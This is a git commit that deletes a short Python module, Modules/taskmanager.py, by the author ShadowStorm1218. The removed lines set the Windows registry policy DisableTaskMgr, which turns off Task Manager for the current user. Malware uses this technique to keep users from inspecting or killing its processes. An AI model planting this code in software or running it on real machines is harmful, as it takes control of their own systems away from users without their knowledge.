3b5d9fabe15a74a31e511846e14f644fb48fc5c8
ShadowStorm1218 <69068112+ShadowStorm1218@users.noreply.github.com>
2023-03-30 17:18:53 -0500

    Delete taskmanager.py

--- Modules/taskmanager.py
+++
@@ -1,5 +0,0 @@
-import winreg
-
-key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_ALL_ACCESS)
-winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-key.Close()
